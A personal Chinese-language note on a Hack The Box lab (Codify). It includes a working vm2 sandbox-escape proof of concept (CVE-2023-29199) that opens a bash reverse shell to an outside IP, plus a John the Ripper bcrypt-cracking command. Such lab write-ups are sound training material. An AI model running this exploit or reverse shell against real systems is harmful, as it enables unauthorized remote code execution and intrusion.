---
UID: 20250621140608
aliases: 
tags:
  - 打靶
  - 靶场
  - hackthebox
source: 
cssclasses: 
created: 2025-06-21
---
[[htb 靶场 Codify（python脚本）]]
## 扫描端口
![image.png](https://s2.loli.net/2025/06/21/M4GYxLR28IwFiNQ.png)

有两个 http 的端口，一个 ssh 端口。需要我们重定向，配置一下/etc/hosts


## web 服务信息收集
![image.png](https://s2.loli.net/2025/06/21/c81a6spwOqXm4My.png)

是个编写 node. js 代码的平台

写一个 node. js 的反弹 shell
![image.png](https://s2.loli.net/2025/06/21/u58JydpSno6HfTF.png)

![image.png](https://s2.loli.net/2025/06/21/3JaqeRjkQExyrWS.png)

但是这里面有限制，不能用这些

没得头绪了，只能信息收集

## vm 2 漏洞利用
![image.png](https://s2.loli.net/2025/06/21/4oKaxgSNHwAMXBz.png)

在这里能看到使用了 vm 2 这个 js 的库，点进去能找到版本号
![image.png](https://s2.loli.net/2025/06/21/MJKt5XLhTay2wbv.png)

vm 2 有个沙箱逃逸漏洞**CVE-2023-29199**
![image.png](https://s2.loli.net/2025/06/21/rmDaGhvfXPL54Co.png)


找到了 poc
![image.png](https://s2.loli.net/2025/06/21/b7hCPzaFvXk3RKE.png)

shell 在此
```
const {VM} = require("vm2");
const vm = new VM();

const code = `
aVM2_INTERNAL_TMPNAME = {};
function stack() {
    new Error().stack;
    stack();
}
try {
    stack();
} catch (a$tmpname) {
    a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').execSync('bash -c ‘exec bash -i &>/dev/tcp/10.10.16.12/8888 <&1’');
}
`

console.log(vm.run(code));
```

获得反弹 shell

![image.png](https://s2.loli.net/2025/06/21/sO5L9VvxeNGPlMX.png)


## 提权
在 opt 目录下找到一个 root 权限的脚本
![image.png](https://s2.loli.net/2025/06/21/L9mJBRFHGY7f86h.png)


我们可以试试环境变量劫持或者别的。先继续收集

### linpeas 收集
![image.png](https://s2.loli.net/2025/06/21/Ashg8SuZJOK6kry.png)

定时任务


![image.png](https://s2.loli.net/2025/06/21/zFrx3B4nkptGqR8.png)

有好几个数据库的文件
![image.png](https://s2.loli.net/2025/06/21/8jGsZd4Do1EBtAp.png)

在这个数据库中找到了密码和账户

![image.png](https://s2.loli.net/2025/06/21/Rpd2IEjDuAfhw6i.png)

是 bcrypt 加密。
```
john --wordlist=/home/kali/下载/rockyou.txt john.txt --format=bcrypt
```
![image.png](https://s2.loli.net/2025/06/21/R8DtJo4MQbHh2z3.png)


用 ssh 登录登录成功
![image.png](https://s2.loli.net/2025/06/21/df2pMn6Yvu4a7Uw.png)

![image.png](https://s2.loli.net/2025/06/21/FkbXUxeKaq6d3ug.png)

## 提权
![image.png](https://s2.loli.net/2025/06/21/Bp453T8v2wd1CRs.png)

这个脚本是提权的关键

后面需要写 python 脚本才能获得 root 的密码。暂时解锁 python 脚本怎么写

只能看 wp 获得 flag